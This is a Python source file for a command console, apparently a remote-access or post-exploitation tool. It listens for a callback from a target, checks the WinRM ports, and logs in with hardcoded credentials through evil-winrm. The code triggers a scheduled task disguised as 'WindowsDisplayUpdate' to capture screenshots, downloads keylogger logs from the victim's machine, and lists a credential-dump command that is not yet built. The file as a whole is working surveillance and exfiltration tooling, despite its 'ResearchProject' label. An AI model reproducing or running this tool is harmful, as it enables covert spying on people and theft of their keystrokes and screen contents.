import subprocess
import sys
import socket
import getpass
import platform
import base64
import time
from datetime import datetime

BANNER = r"""
                .88888.              888888ba                                    
               d8'   `88             88    `8b                                   
               88                   a88aaaa8P'                                   
               88   YP88  88888888   88   `8b.                                   
               Y8.   .88             88     88                                   
                `88888'              dP     dP                                   
                                                                  
                                                                  
   888888ba  .d888888d888888P  d888888P.88888.  .88888. dP        
   88    `8bd8'    88   88        88  d8'   `8bd8'   `8b88        
  a88aaaa8P'88aaaaa88a  88        88  88     8888     8888        
   88   `8b.88     88   88        88  88     8888     8888        
   88     8888     88   88        88  Y8.   .8PY8.   .8P88        
   dP     dP88     88   dP        dP   `8888P'  `8888P' 88888888P 
                                                                  
                                                                    
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    conn.close()
    server.close()

    return target_ip

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def ping_target(target_ip, count=1, timeout=2):
    system = platform.system().lower()

    if system == "windows":
        cmd = ["ping", "-n", str(count), "-w", str(timeout * 1000), target_ip]
    else:
        cmd = ["ping", "-c", str(count), "-W", str(timeout), target_ip]

    result = subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return result.returncode == 0

def check_connection(target_ip, timeout=3):
    ports = {
        5985: "WinRM (HTTP)",
        5986: "WinRM (HTTPS)"
    }

    print(f"[*] Checking Connection to {target_ip}...")

    if not ping_target(target_ip):
        print("[-] Ping failed. Host may be down or ICMP blocked.")
        return None

    print("[+] Ping successful. Host is reachable.\n")

    for port, name in ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        try:
            sock.connect((target_ip, port))
            print(f"[+] {name} port {port} is OPEN")
        except socket.timeout:
            print(f"[-] {name} port {port} timed out")
        except ConnectionRefusedError:
            print(f"[-] {name} port {port} is CLOSED")
        except Exception as e:
            print(f"[-] {name} port {port} error: {e}")
        finally:
            sock.close()
    return target_ip

def screenshot(target_ip):
    print("[*] Triggering screenshot task...")

    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        TASK_NAME = "WindowsDisplayUpdate"
        REMOTE_FILE = "C:\\Users\\Public\\screen.png"
        LOCAL_FILE = f"./Box/screen_{target_ip}_{timestamp}.png"
        payload = 'Start-ScheduledTask -TaskName "WindowsDisplayUpdate"'


        subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )


        time.sleep(3)  # give task time to write file

        print("[*] Downloading screenshot...")
        
        payload = f'download "{REMOTE_FILE}" "{LOCAL_FILE}"'

        subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        print("[+] Screenshot saved to ./Box/")
    except:
        print("[-] Failed to save screenshot")

def keylogger(target_ip):
    print("[*] Downloading keylogger logs...")

    try:
        import os
        
        REMOTE_DIR = "C:\\Users\\Adm1nistrator\\KeyloggerLogs"
        LOCAL_DIR = f"./Box/keylogger_{target_ip}"
        
        # Create local directory if it doesn't exist
        if not os.path.exists(LOCAL_DIR):
            os.makedirs(LOCAL_DIR)
        
        # Get list of remote files
        payload = f'Get-ChildItem "{REMOTE_DIR}" -Filter "*.log" | Select-Object -ExpandProperty FullName'
        
        result = subprocess.run(
            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
            input=payload,
            text=True,
            capture_output=True
        )
        
        remote_files = [f.strip() for f in result.stdout.split('\n') if f.strip() and f.strip().endswith('.log')]
        
        if not remote_files:
            print("[-] No log files found on remote system")
            return
        
        print(f"[*] Found {len(remote_files)} log files on remote system")
        
        # Get list of already downloaded files
        local_files = set()
        if os.path.exists(LOCAL_DIR):
            local_files = {os.path.basename(f) for f in os.listdir(LOCAL_DIR) if f.endswith('.log')}
        
        # Download only new files
        downloaded_count = 0
        for remote_file in remote_files:
            local_filename = os.path.basename(remote_file)
            
            if local_filename in local_files:
                print(f"[~] Already have {local_filename}, skipping...")
                continue
            
            local_path = os.path.join(LOCAL_DIR, local_filename)
            payload = f'download "{remote_file}" "{local_path}"'
            
            subprocess.run(
                ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
                input=payload,
                text=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            print(f"[+] Downloaded {local_filename}")
            downloaded_count += 1
        
        if downloaded_count == 0:
            print("[*] All files already downloaded")
        else:
            print(f"[+] Downloaded {downloaded_count} new file(s) to {LOCAL_DIR}/")
            
    except Exception as e:
        print(f"[-] Failed to download keylogger logs: {e}")

def cli():
    username = getpass.getuser()
    current_target = None
    help_text = """
        Available commands:
        help, h        Show this help menu
        listen         Start listening for a target
        check          Check target connectivity (WinRM ports)
        evil-winrm     Connect to target using evil-winrm
        key-logger     To be determined
        screen-shot    Take screenshot
        dump           Credentials dump
        exit, q        Exit the console
    """
    print("[*] Type help or h to see all commands...\n")
    while True:
        cmd = input(f"{username}@ResearchProject# ")
        if cmd == "exit" or cmd == "q":
            print("[+] Exiting console.")
            break

        elif cmd == "help" or cmd == "h":
            print(help_text)

        elif cmd == "listen":
            current_target = start_listener()

        elif cmd == "check":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                check_connection(current_target)

        elif cmd == "evil-winrm":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                current_target = connect_evil_winrm(current_target)

        elif cmd == "key-logger":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                keylogger(current_target)

        elif cmd == "screen-shot":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                screenshot(current_target)
        
        elif cmd == "dump":
            print("In progress...")

        elif cmd == "":
            continue

        else:
            print(f"[-] Unknown command: {cmd}")


def main():
    print(BANNER)
    try:
        cli()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    

if __name__ == "__main__":
    main()
